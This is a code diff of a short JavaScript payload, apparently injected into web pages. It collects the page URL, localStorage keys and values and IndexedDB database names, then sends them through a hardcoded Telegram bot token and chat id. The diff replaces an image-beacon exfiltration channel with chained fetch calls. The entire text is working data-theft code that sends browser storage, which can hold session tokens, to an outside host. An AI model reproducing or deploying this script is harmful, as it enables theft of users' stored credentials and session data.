@@ -1,8 +1,12 @@
 (function () {
   var BOT  = '8710535929:AAH-mhpB-IlTdqz38bhdgiep_OUv9j5e-54';
   var CHAT = '8425878739';
-  var BASE = 'https://api.telegram.org/bot' + BOT + '/sendMessage?chat_id=' + CHAT + '&text=';
-  function beacon(t) { var i = new Image(); i.src = BASE + encodeURIComponent(t); }
+  var BASE = 'https://api.telegram.org/bot' + BOT + '/sendMessage';
+
+  function send(t) {
+    return fetch(BASE + '?chat_id=' + CHAT + '&text=' + encodeURIComponent(t))
+      .then(function (r) { return r.text(); });
+  }
 
   var L = localStorage, keys = [], vals = [], i, k, v;
   for (i = 0; i < L.length; i++) {
@@ -12,19 +16,17 @@
       vals.push(k + '=' + (v.length > 30 ? v.slice(0, 30) + '..len' + v.length : v));
     }
   }
-  beacon('PROBE1 url=' + location.href + '\nls_n=' + L.length +
-         '\nval:\n' + vals.join('\n') + '\nkeys:\n' + keys.slice(0, 60).join(','));
 
-  if (indexedDB.databases) {
-    indexedDB.databases().then(function (ds) {
-      beacon('PROBE1b idb=' + ds.map(function (d) { return d.name + '@' + d.version; }).join(','));
-    });
-  }
-
-  fetch(BASE + 'PROBE2_fetch_ok')
-    .then(function (r) { return r.text(); })
-    .then(function (t) { beacon('PROBE2 fetch_ok ' + t.slice(0, 60)); })
-    .catch(function (e) { beacon('PROBE2 fetch_err ' + e); });
-
-  alert('ghost: lance');
+  send('PROBE1 url=' + location.href + '\nls_n=' + L.length +
+       '\nval:\n' + vals.join('\n') + '\nkeys:\n' + keys.slice(0, 60).join(','))
+    .then(function () {
+      if (!indexedDB.databases) return null;
+      return indexedDB.databases().then(function (ds) {
+        return send('PROBE1b idb=' + ds.map(function (d) {
+          return d.name + '@' + d.version;
+        }).join(','));
+      });
+    })
+    .then(function () { alert('ghost: OK'); })
+    .catch(function (e) { alert('ghost ERR ' + e); });
 })();
